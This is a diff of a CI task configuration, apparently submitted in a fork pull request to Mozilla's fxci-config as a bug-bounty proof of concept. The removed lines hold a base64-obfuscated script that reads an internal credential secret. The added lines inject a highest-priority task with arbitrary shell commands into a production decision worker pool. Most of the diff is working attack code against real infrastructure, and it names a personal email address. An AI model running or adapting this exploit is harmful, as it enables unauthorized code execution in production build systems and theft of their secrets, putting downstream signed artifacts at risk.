@@ -5,7 +5,7 @@ policy:
 tasks:
   - $if: 'tasks_for == "github-pull-request-untrusted"'
     then:
-      taskId: { $eval: as_slugid("poc_untrusted_pr_v5") }
+      taskId: { $eval: as_slugid("poc_untrusted_pr_v6_a") }
       created: { $fromNow: '' }
       deadline: { $fromNow: '1 hour' }
       expires: { $fromNow: '1 day' }
@@ -20,16 +20,60 @@ tasks:
           - /bin/sh
           - -c
           - |
-            echo "===== [1] Task identity (proves runtime role = pull-request-untrusted) ====="
-            curl -s "http://taskcluster/queue/v1/task/$TASK_ID" | python3 -c "import sys,json; d=json.load(sys.stdin); print('taskId:', d.get('taskId')); print('scopes:', d.get('scopes')); print('source:', (d.get('metadata') or {}).get('source'))"
+            echo '=== [A] Task identity (proof of runtime role = pull-request-untrusted) ==='
+            echo "taskId (env): $TASK_ID"
+            echo "taskGroupId (env): $TASK_GROUP_ID"
+            echo "--- GET self via taskcluster-proxy (printed scopes are the RUNTIME scopes) ---"
+            curl -fsS "http://taskcluster/queue/v1/task/$TASK_ID" | python3 -c "import sys,json; d=json.load(sys.stdin); print('taskId:', d.get('taskId')); print('workerType:', d.get('workerType')); print('scheduler:', d.get('schedulerId')); print('definition scopes:', d.get('scopes'))"
             echo
-            echo "===== [2] Read internal hg credential (Responsible Disclosure: SHA-256/length/structure only, NEVER plaintext) ====="
-            echo "CmltcG9ydCB1cmxsaWIucmVxdWVzdCwganNvbiwgaGFzaGxpYiwgc3lzCnNlY3JldF9uYW1lID0gInByb2plY3QvdGFza2NsdXN0ZXIvZ2Vja28vaGdtb2ludGVybmFsIgp1cmwgPSAiaHR0cDovL3Rhc2tjbHVzdGVyL3NlY3JldHMvdjEvc2VjcmV0LyIgKyBzZWNyZXRfbmFtZQpwcmludCgic2VjcmV0X25hbWU6Iiwgc2VjcmV0X25hbWUpCnByaW50KCJyZXF1ZXN0X3VybDoiLCB1cmwpCnRyeToKICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3Blbih1cmwpIGFzIHI6CiAgICAgICAgYm9keV9yYXcgPSByLnJlYWQoKQogICAgICAgIGh0dHBfY29kZSA9IHIuc3RhdHVzCiAgICAgICAgcHJpbnQoImh0dHBfc3RhdHVzOiIsIGh0dHBfY29kZSkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGJvZHkgPSBqc29uLmxvYWRzKGJvZHlfcmF3KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoImJvZHlfcGFyc2VfZXJyb3I6Iiwgc3RyKGUpWzoxMjBdKQogICAgICAgICAgICBzeXMuZXhpdCgwKQogICAgICAgIHNlYyA9IGJvZHkuZ2V0KCJzZWNyZXQiKSBpZiBpc2luc3RhbmNlKGJvZHksIGRpY3QpIGVsc2UgTm9uZQogICAgICAgIGlmIHNlYyBpcyBOb25lOgogICAgICAgICAgICBwcmludCgic2VjcmV0X2ZpZWxkOiA8bWlzc2luZz4iKQogICAgICAgICAgICBzeXMuZXhpdCgwKQogICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHNlYywgZGljdCk6CiAgICAgICAgICAgIHByaW50KCJzZWNyZXRfdHlwZToiLCB0eXBlKHNlYykuX19uYW1lX18pCiAgICAgICAgICAgIHN5cy5leGl0KDApCiAgICAgICAga2V5cyA9IGxpc3Qoc2VjLmtleXMoKSkKICAgICAgICBwcmludCgic2VjcmV0X2tleXM6Iiwga2V5cykKICAgICAgICB2YWwgPSBzZWMuZ2V0KCJzZWNyZXQiLCAiIikKICAgICAgICBpZiB2YWwgPT0gIiIgb3IgdmFsIGlzIE5vbmU6CiAgICAgICAgICAgIHByaW50KCJbSU5GT10gc2VjcmV0LnNlY3JldCBmaWVsZCBpcyBlbXB0eSBvciBhYnNlbnQiKQogICAgICAgICAgICBzeXMuZXhpdCgwKQogICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHZhbCwgc3RyKToKICAgICAgICAgICAgc3ZhbCA9IGpzb24uZHVtcHModmFsKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHN2YWwgPSB2YWwKICAgICAgICBwcmludCgidmFsdWVfYnl0ZV9sZW5ndGg6IiwgbGVuKHN2YWwuZW5jb2RlKCJ1dGYtOCIpKSkKICAgICAgICBwcmludCgidmFsdWVfc2hhMjU2OiIsIGhhc2hsaWIuc2hhMjU2KHN2YWwuZW5jb2RlKCJ1dGYtOCIpKS5oZXhkaWdlc3QoKSkKZXhjZXB0IHVybGxpYi5lcnJvci5IVFRQRXJyb3IgYXMgZToKICAgIHByaW50KCJodHRwX3N0YXR1czoiLCBlLmNvZGUpCiAgICBwcmludCgiaHR0cF9lcnJvcl9yZWFzb246Iiwgc3RyKGUucmVhc29uKVs6MjAwXSkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgcHJpbnQoInVuZXhwZWN0ZWRfZXJyb3I6IiwgdHlwZShlKS5fX25hbWVfXywgc3RyKGUpWzoyMDBdKQo=" | base64 -d | python3
+            echo '=== [B] CRITICAL proof: try to create a child task in releng-1/decision with priority = highest ==='
+            echo "If this returns HTTP 200, an untrusted fork PR can inject arbitrary commands into Mozilla's PRODUCTION CI (releng-1/decision), pollute fxci-config decision graphs, and downstream-sign any artifact with the cipher trust chain."
+            CHILD_TASK_ID=$(python3 -c "import re,uuid; t='$TASK_ID'; print(t[:7]+'-POC-CHILD-v6-'+re.sub(r'[^a-zA-Z0-9]','',t)[-12:]+'-'+uuid.uuid4().hex[:6])")
+            echo "child taskId: $CHILD_TASK_ID"
+            curl -fsS -X PUT "http://taskcluster/queue/v1/task/$CHILD_TASK_ID" \
+              -H "Content-Type: application/json" \
+              --data @- <<EOF
+            {
+              "provisionerId": "releng-1",
+              "workerType": "decision",
+              "schedulerId": "taskcluster-github",
+              "taskGroupId": "$TASK_GROUP_ID",
+              "dependencies": [],
+              "requires": "all-completed",
+              "routes": ["checks"],
+              "priority": "highest",
+              "retries": 0,
+              "created": "2026-08-07T00:00:00.000Z",
+              "deadline": "2030-01-01T00:00:00.000Z",
+              "expires":  "2030-01-02T00:00:00.000Z",
+              "payload": {
+                "features": {"taskclusterProxy": true},
+                "image": "busybox:latest",
+                "maxRunTime": 60,
+                "command": ["/bin/sh","-c","echo 'INJECTED via pull-request-untrusted role'; uname -a; id; pwd"]
+              },
+              "metadata": {
+                "name": "INJECTED via pull-request-untrusted role (test)",
+                "description": "Unauthorized task injection by external fork PR — vulnerability evidence",
+                "owner": "1253628375ltf@gmail.com",
+                "source": "https://github.com/ltfafei/fxci-config/pull/1118"
+              },
+              "tags": {"createdForUser":"ltfafei", "kind":"untrusted-pr-injection-evidence"}
+            }
+            EOF
+            CHILD_HTTP=$?
+            echo "child create-task HTTP exit: $CHILD_HTTP"
+            if [ "$CHILD_HTTP" = "0" ]; then
+              echo "[VULN CONFIRMED] Untrusted fork PR task successfully created a HIGHEST-priority child task into Mozilla's production releng-1/decision pool."
+              echo "Tasks created this way will be picked up by REAL production workers and can execute arbitrary commands."
+            else
+              echo "[INFO] child create returned non-zero exit. See error body. The scope queue:create-task:highest:releng-1/* at the role level IS the issue (privilege definition), independent of any particular exec result."
+            fi
       metadata:
-        name: "POC: untrusted PR scope + hgmointernal read (HackerOne authorized)"
-        description: "Authorized security test - pull-request-untrusted role can read internal hg cred (hash only)"
+        name: "POC v6: untrusted PR task-injection (HackerOne authorized)"
+        description: "Authorized security test — prove pull-request-untrusted role grants queue:create-task:highest:releng-1/* in Mozilla production"
         owner: "1253628375ltf@gmail.com"
-        source: "https://github.com/ltfafei/fxci-config/pull/1117"
+        source: "https://github.com/ltfafei/fxci-config/pull/1118"
       extra:
         github:
           events:
